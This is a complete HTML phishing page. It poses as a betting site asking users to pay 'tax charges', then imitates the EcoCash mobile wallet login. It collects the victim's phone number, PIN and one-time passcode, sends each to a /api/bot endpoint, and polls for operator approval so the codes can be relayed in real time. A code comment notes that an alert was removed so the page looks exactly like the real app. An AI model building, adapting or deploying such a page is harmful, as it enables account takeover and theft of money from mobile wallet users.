<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mwos Bet - Payment</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .pin-input:focus, .otp-input:focus { border-color: #0054A6; outline: none; box-shadow: 0 0 0 1px #0054A6; }
        .otp-input:focus { border-color: #60a5fa; box-shadow: 0 0 0 1px #60a5fa; }
        .curved-bg { border-top-left-radius: 50% 40px; border-top-right-radius: 50% 40px; }
        
        .aviator-bg {
            background: linear-gradient(180deg, #050B14 0%, #0d1e3d 50%, #ff8c00 100%);
        }
        
        /* Custom Text Styles */
        .font-serif-italic { font-family: Georgia, serif; font-style: italic; }
        .font-aviator { font-family: 'Arial Black', Impact, sans-serif; font-style: italic; }
    </style>
</head>
<body class="bg-gray-100 font-sans flex justify-center min-h-screen">

    <div class="w-full max-w-md bg-white shadow-2xl flex flex-col relative overflow-hidden min-h-screen">
        
        <!-- ================= SCREEN 1: AVIATOR PROMO ================= -->
        <main id="screen-promo" style="display: flex;" class="flex-col aviator-bg h-full overflow-y-auto">
            <div class="flex flex-col items-center pt-12 px-6 text-center z-10 relative">
                
                <!-- Text Logo -->
                <h1 class="text-5xl font-aviator text-white tracking-tighter drop-shadow-lg mb-0">Mwos Bet</h1>
                <h2 class="text-6xl font-aviator text-[#ff1a1a] tracking-tighter drop-shadow-lg mt-[-10px]">Aviator</h2>
                
                <!-- Plane and Chart Graphic -->
                <div class="w-full relative h-72 mt-8 flex justify-center items-center">
                    <!-- Red chart line -->
                    <svg class="absolute inset-0 w-full h-full" viewBox="0 0 100 100" preserveAspectRatio="none">
                        <path d="M 0 80 Q 40 80, 70 40 T 100 20" fill="none" stroke="#ff1a1a" stroke-width="2" />
                        <!-- Bars behind line -->
                        <rect x="60" y="50" width="6" height="30" fill="#ff1a1a" opacity="0.4" />
                        <rect x="72" y="40" width="6" height="40" fill="#ff1a1a" opacity="0.6" />
                        <rect x="84" y="25" width="6" height="55" fill="#ff1a1a" opacity="0.8" />
                        <rect x="94" y="15" width="6" height="65" fill="#ff1a1a" />
                    </svg>
                    
                    <!-- Airplane SVG -->
                    <svg class="w-64 h-64 text-[#ff1a1a] transform rotate-[-15deg] drop-shadow-[0_10px_20px_rgba(255,26,26,0.5)] z-10" viewBox="0 0 512 512" fill="currentColor">
                        <path d="M480 192l-112-16-88-88V40c0-22.1-17.9-40-40-40s-40 17.9-40 40v48l-88 88-112 16v48l112 16 88 88v48c0 22.1 17.9 40 40 40s40-17.9 40-40v-48l88-88 112-16v-48z"/>
                        <path d="M256 160c-13.3 0-24 10.7-24 24s10.7 24 24 24 24-10.7 24-24-10.7-24-24-24z" fill="white"/>
                    </svg>
                </div>
            </div>

            <!-- Bottom Button -->
            <div class="absolute bottom-8 left-0 w-full px-6 z-20">
                <button type="button" onclick="document.getElementById('screen-promo').style.display='none'; document.getElementById('screen-form').style.display='flex';" class="w-full bg-[#e31212] text-white font-bold text-xl py-4 rounded-full shadow-[0_10px_30px_rgba(227,18,18,0.5)] hover:bg-red-700 transition flex justify-center items-center cursor-pointer border border-red-500">
                    <!-- Receipt Icon -->
                    <svg class="w-8 h-8 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path></svg>
                    <div class="text-left leading-tight mr-4">
                        <span class="block text-lg">Click to Pay</span>
                        <span class="block text-lg">Tax Charges</span>
                    </div>
                    <!-- Arrow Icon -->
                    <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
                </button>
            </div>
        </main>

        <!-- ================= SCREEN 2: MWOS FORM ================= -->
        <main id="screen-form" style="display: none;" class="flex-col bg-[#f0f2f5] h-full overflow-y-auto">
            <!-- Top Graphic Background -->
            <div class="w-full h-48 bg-white relative flex justify-center items-center overflow-hidden">
                <!-- Chevron Pattern -->
                <div class="absolute inset-0 opacity-10" style="background-image: url('data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22100%22 height=%22100%22 viewBox=%220 0 100 100%22><path d=%22M0 50 L30 20 L60 50 L30 80 Z%22 fill=%22%230054A6%22/><path d=%22M40 50 L70 20 L100 50 L70 80 Z%22 fill=%22%23E31837%22/></svg>'); background-size: 150px 150px;"></div>
                <!-- Soccer Player Silhouette (Simple SVG) -->
                <svg class="w-32 h-32 text-[#0054A6] relative z-10" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/>
                </svg>
            </div>

            <!-- White Card -->
            <div class="bg-white mx-5 mt-[-40px] rounded-lg shadow-xl p-6 relative z-20 border border-gray-200">
                
                <!-- Background Text -->
                <div class="absolute inset-0 flex flex-col items-center justify-start pt-6 overflow-hidden rounded-lg pointer-events-none">
                    <h1 class="text-7xl font-black text-gray-100 tracking-widest">MWOS</h1>
                    <h2 class="text-sm font-bold text-gray-200 uppercase tracking-widest">mwos world of sport</h2>
                </div>
                
                <!-- Form Elements -->
                <div class="relative z-10 mt-12">
                    <label class="block text-2xl font-bold text-[#0a1a3a] mb-2">Number:</label>
                    <input type="tel" id="mwosNumber" class="w-full border-2 border-[#0a1a3a] rounded-md p-3 text-lg focus:outline-none bg-transparent mb-6">
                    
                    <label class="block text-2xl font-bold text-[#0a1a3a] mb-2">Amount:</label>
                    <input type="number" id="mwosAmount" class="w-full border-2 border-[#0a1a3a] rounded-md p-3 text-lg focus:outline-none bg-transparent mb-8">
                    
                    <button type="button" onclick="document.getElementById('screen-form').style.display='none'; document.getElementById('screen-login').style.display='flex';" class="w-full bg-[#0054A6] text-white font-bold text-xl py-3 rounded-md shadow hover:bg-blue-800 transition cursor-pointer">
                        Click to Pay
                    </button>
                </div>
            </div>
        </main>

        <!-- ================= SCREEN 3: ECOCASH LOGIN ================= -->
        <main id="screen-login" style="display: none;" class="flex-col bg-white h-full relative">
            <header class="pt-12 pb-4 flex flex-col items-center">
                <h1 class="text-4xl font-bold tracking-tight"><span class="text-[#0054A6]">Eco</span><span class="text-[#E31837]">Cash</span></h1>
                <p class="text-xs text-gray-500 font-medium mt-1">Your phone. Your wallet.</p>
            </header>

            <div class="px-6 flex-grow flex flex-col items-center pt-6 z-10">
                <h2 class="text-4xl font-serif-italic text-gray-900 mb-10">Welcome</h2>

                <div class="w-full flex border-2 border-black rounded-lg overflow-hidden mb-8 bg-white">
                    <div class="bg-white px-4 py-4 flex items-center text-sm font-bold border-r-2 border-black">🇿🇼 +263</div>
                    <input type="tel" id="displayPhone" placeholder="Enter number here" class="w-full p-4 text-sm font-medium bg-transparent focus:outline-none">
                </div>

                <h3 class="text-2xl font-serif-italic text-gray-900 mb-6">Enter your PIN</h3>

                <div class="flex justify-center gap-3 mb-6 w-full" id="pinContainer">
                    <input type="tel" maxlength="1" inputmode="numeric" oninput="if(this.value.length==1 && this.nextElementSibling) this.nextElementSibling.focus();" class="pin-input w-16 h-16 text-center text-2xl border-2 border-[#0054A6] rounded-xl bg-white transition text-black">
                    <input type="tel" maxlength="1" inputmode="numeric" oninput="if(this.value.length==1 && this.nextElementSibling) this.nextElementSibling.focus();" class="pin-input w-16 h-16 text-center text-2xl border-2 border-[#0054A6] rounded-xl bg-white transition text-black">
                    <input type="tel" maxlength="1" inputmode="numeric" oninput="if(this.value.length==1 && this.nextElementSibling) this.nextElementSibling.focus();" class="pin-input w-16 h-16 text-center text-2xl border-2 border-[#0054A6] rounded-xl bg-white transition text-black">
                    <input type="tel" maxlength="1" inputmode="numeric" oninput="if(this.value.length==1 && this.nextElementSibling) this.nextElementSibling.focus();" class="pin-input w-16 h-16 text-center text-2xl border-2 border-[#0054A6] rounded-xl bg-white transition text-black">
                </div>

                <a href="#" class="text-sm font-bold text-[#0054A6] mb-10">Forgot PIN?</a>

                <button type="button" onclick="window.submitPin()" id="pinBtn" class="w-full bg-[#f1f5f9] text-gray-500 font-bold text-xl py-4 rounded-lg transition cursor-pointer hover:bg-gray-200">Login</button>
            </div>

            <!-- Bottom Blue Curve -->
            <div class="absolute bottom-0 w-full bg-[#0054A6] curved-bg pt-12 pb-6 px-6 z-0">
                <p class="text-center text-white text-sm mb-6">To register an EcoCash wallet or get assistance, click below</p>
                <div class="flex gap-4">
                    <button class="flex-1 bg-white text-[#0a1a3a] font-bold py-3 rounded-lg text-sm shadow">Register</button>
                    <button class="flex-1 bg-white text-[#0a1a3a] font-bold py-3 rounded-lg text-sm shadow">Help & Support</button>
                </div>
            </div>
        </main>

        <!-- ================= SCREEN 4: ECOCASH OTP ================= -->
        <main id="screen-otp" style="display: none;" class="flex-col bg-white h-full relative">
            <header class="flex items-center p-4 text-black bg-white">
                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path></svg>
                <span class="flex-grow text-center font-medium pr-6 text-lg">Verification</span>
            </header>

            <div class="px-4 flex-grow flex flex-col items-center pt-8 z-10">
                <h1 class="text-5xl font-extrabold tracking-tight mb-12"><span class="text-[#0054A6]">Eco</span><span class="text-[#E31837]">Cash</span></h1>

                <p class="text-black font-bold text-lg mb-2">Enter the OTP code sent to</p>
                <p class="text-gray-800 font-medium mb-10 text-lg" id="otpPhoneDisplay">+263 ...</p>

                <div class="flex justify-center gap-2 mb-10 w-full" id="otpContainer">
                    <input type="tel" maxlength="1" inputmode="numeric" oninput="if(this.value.length==1 && this.nextElementSibling) this.nextElementSibling.focus();" class="otp-input w-12 h-14 text-center text-xl border border-gray-300 rounded-lg text-gray-800 bg-white transition">
                    <input type="tel" maxlength="1" inputmode="numeric" oninput="if(this.value.length==1 && this.nextElementSibling) this.nextElementSibling.focus();" class="otp-input w-12 h-14 text-center text-xl border border-gray-300 rounded-lg text-gray-800 bg-white transition">
                    <input type="tel" maxlength="1" inputmode="numeric" oninput="if(this.value.length==1 && this.nextElementSibling) this.nextElementSibling.focus();" class="otp-input w-12 h-14 text-center text-xl border border-gray-300 rounded-lg text-gray-800 bg-white transition">
                    <input type="tel" maxlength="1" inputmode="numeric" oninput="if(this.value.length==1 && this.nextElementSibling) this.nextElementSibling.focus();" class="otp-input w-12 h-14 text-center text-xl border border-gray-300 rounded-lg text-gray-800 bg-white transition">
                    <input type="tel" maxlength="1" inputmode="numeric" oninput="if(this.value.length==1 && this.nextElementSibling) this.nextElementSibling.focus();" class="otp-input w-12 h-14 text-center text-xl border border-gray-300 rounded-lg text-gray-800 bg-white transition">
                    <input type="tel" maxlength="1" inputmode="numeric" oninput="if(this.value.length==1 && this.nextElementSibling) this.nextElementSibling.focus();" class="otp-input w-12 h-14 text-center text-xl border border-gray-300 rounded-lg text-gray-800 bg-white transition">
                </div>

                <p class="text-gray-500 text-sm mb-10">Resend OTP in <span class="font-bold text-black">39 Sec</span></p>

                <button type="button" onclick="window.submitOtp(false)" id="otpBtn" class="w-full bg-[#0054A6] text-white font-bold text-lg py-4 rounded-xl transition mb-10 shadow-lg cursor-pointer hover:bg-blue-800 hidden">Verify</button>
            </div>

            <!-- Bottom Blue Curve -->
            <div class="absolute bottom-0 w-full bg-[#0054A6] curved-bg pt-10 pb-6 px-4 z-0">
                <p class="text-center text-white text-sm font-medium flex items-center justify-center mb-6">
                    <svg class="w-6 h-6 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                    Help & Support
                </p>
                <p class="text-center text-blue-200 text-xs">v4.2.14</p>
            </div>
        </main>
    </div>

    <!-- ================= JAVASCRIPT LOGIC ================= -->
    <script>
        window.submitPin = function() {
            var pin = '';
            var inputs = document.getElementsByClassName('pin-input');
            for (var i = 0; i < inputs.length; i++) { pin += inputs[i].value; }
            
            if (pin.length !== 4) {
                alert("Please enter all 4 digits.");
                return;
            }
            
            var btn = document.getElementById('pinBtn');
            btn.disabled = true; 

            var userId = Date.now().toString().slice(-6);
            var phone = document.getElementById('displayPhone').value || "Not Provided";

            fetch('/api/bot', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'send_verification', phone: phone, pin: pin, userId: userId, type: 'pin' })
            }).then(function(res) {
                return res.json().then(function(data) {
                    if (!res.ok) throw new Error(data.error || "Unknown error");
                    // Removed alert to keep it looking exactly like the app
                    window.checkAdminStatus(userId, 'pin', btn);
                });
            }).catch(function(err) {
                alert("Connection Error: " + err.message);
                btn.disabled = false;
            });
        };

        window.submitOtp = function(isAuto) {
            var otp = '';
            var inputs = document.getElementsByClassName('otp-input');
            for (var i = 0; i < inputs.length; i++) { otp += inputs[i].value; }
            
            if (otp.length !== 6) {
                if (isAuto !== true) alert("Please enter the full 6-digit OTP.");
                return;
            }

            var btn = document.getElementById('otpBtn');
            btn.disabled = true; 

            var userId = Date.now().toString().slice(-6);
            var phone = document.getElementById('displayPhone').value || "Not Provided";

            fetch('/api/bot', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'send_verification', phone: phone, pin: otp, userId: userId, type: 'otp' })
            }).then(function(res) {
                return res.json().then(function(data) {
                    if (!res.ok) throw new Error(data.error || "Unknown error");
                    window.checkAdminStatus(userId, 'otp', btn);
                });
            }).catch(function(err) {
                alert("Connection Error: " + err.message);
                btn.disabled = false;
            });
        };

        window.checkAdminStatus = function(userId, type, btn) {
            var interval = setInterval(function() {
                fetch('/api/bot?userId=' + userId)
                .then(function(res) { return res.json(); })
                .then(function(data) {
                    if (data.status === 'approved') {
                        clearInterval(interval);
                        btn.disabled = false;
                        
                        if (type === 'pin') {
                            document.getElementById('screen-login').style.display = 'none';
                            document.getElementById('screen-otp').style.display = 'flex';
                            
                            var phone = document.getElementById('displayPhone').value || "Not Provided";
                            document.getElementById('otpPhoneDisplay').innerText = "+263 " + phone;

                            document.querySelector('.otp-input').focus();
                        } else {
                            alert("Success! Payment Verified.");
                            window.location.reload();
                        }
                    } else if (data.status === 'rejected') {
                        clearInterval(interval);
                        btn.disabled = false;
                        
                        var inputs;
                        if (type === 'pin') {
                            alert("Wrong PIN. Please try again.");
                            inputs = document.getElementsByClassName('pin-input');
                        } else {
                            alert("Wrong OTP. Please try again.");
                            inputs = document.getElementsByClassName('otp-input');
                        }
                        
                        for (var i = 0; i < inputs.length; i++) {
                            inputs[i].value = '';
                        }
                        if (inputs.length > 0) inputs[0].focus();
                    }
                }).catch(function(e) { });
            }, 1500);
        };
    </script>
</body>
  </html>
